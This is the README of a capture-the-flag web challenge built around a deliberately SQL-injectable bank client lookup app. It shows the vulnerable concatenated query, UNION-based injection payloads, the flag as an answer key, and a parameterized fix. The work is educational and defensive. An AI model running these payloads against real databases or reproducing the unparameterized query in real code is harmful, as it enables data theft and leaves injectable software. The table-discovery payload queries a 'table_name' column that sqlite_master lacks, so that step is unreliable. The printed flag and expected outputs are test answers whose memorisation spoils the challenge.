# qlookup CTF Challenge

A vulnerable QuoccaBank Client Lookup service vulnerable to SQL injection attacks.

## Setup & Running

```bash
pip install -r requirements.txt
python app.py
```

The application will be available at `http://localhost:5000`

## Challenge Description

The qlookup service is a client lookup tool that searches the QuoccaBank client database. Your goal is to find the FLAG hidden in the system.

### Hints from the Application

1. **HTML TODO Comments:**
   - "alphanumerical characters seem to be breaking the queries for some reason?"
   - "maybe remove the company data at /flag"

2. **Dropdown Menu Items:**
   - Flag
   - Secret keys
   - Exam solutions

## Vulnerability Analysis

The application has a **SQL Injection vulnerability** in the main query handler.

### Vulnerable Code (app.py)

```python
# VULNERABLE: Direct string concatenation without parameterization
sql_query = f"SELECT * FROM clients WHERE name LIKE '%{query_text}%' OR email LIKE '%{query_text}%'"
cursor.execute(sql_query)
```

The user input (`query_text`) is directly concatenated into the SQL query without any sanitization or parameterization.

## Exploitation Steps

### Step 1: Basic SQL Injection to Escape the Query

Try entering a single quote to break the query:
```
'
```

You should see an SQL syntax error revealing the query structure.

### Step 2: Union-Based SQL Injection

To discover available tables and extract data, use UNION-based SQL injection:

```sql
' UNION SELECT NULL, table_name, NULL, NULL FROM sqlite_master WHERE type='table' --
```

This will reveal the database structure.

### Step 3: Extract the Flag

Once you discover the `flags` table, extract the flag:

```sql
' UNION SELECT id, flag_text, flag_text, flag_text FROM flags --
```

### Step 4: Alternative - Direct Access (if /flag endpoint is exposed)

Try accessing:
```
http://localhost:5000/flag
```

This endpoint directly returns the flag without SQL injection needed.

## The Flag

The flag is stored in the `flags` table:

```
flag{SQL_Injection_Is_Dangerous_m10dd}
```

## Database Schema

### clients table
```
id (INTEGER PRIMARY KEY)
name (TEXT)
email (TEXT)
account_type (TEXT)
```

### flags table
```
id (INTEGER PRIMARY KEY)
flag_text (TEXT) - Contains the flag
```

## Sample Data

The application includes sample QuoccaBank clients:
- Google LLC
- Amazon Inc
- Microsoft Corp
- Apple Inc
- Meta Platforms

## Security Lessons

1. **Never concatenate user input into SQL queries**
   - Use parameterized queries instead
   - Flask-SQLAlchemy with proper ORM usage prevents this

2. **Proper parameterization example:**
   ```python
   # SAFE:
   cursor.execute("SELECT * FROM clients WHERE name LIKE ? OR email LIKE ?",
                  (f'%{query_text}%', f'%{query_text}%'))
   ```

3. **Input validation is NOT a substitute for parameterization**
   - Always use prepared statements
   - Defense in depth: validation + parameterization + least privilege

## Testing the Exploit

### Test 1: Simple quote break
Input: `'`
Expected: SQL syntax error

### Test 2: Extract table names
Input: `' UNION SELECT NULL, table_name, NULL, NULL FROM sqlite_master WHERE type='table' -- `
Expected: See all tables in database

### Test 3: Extract the flag
Input: `' UNION SELECT id, flag_text, flag_text, flag_text FROM flags -- `
Expected: `flag{SQL_Injection_Is_Dangerous_m10dd}`

### Test 4: Direct access
Visit: `http://localhost:5000/flag`
Expected: JSON response with flag

## Challenge ID

m10dd - Difficulty: Easy/Medium
Category: Web Security - SQL Injection
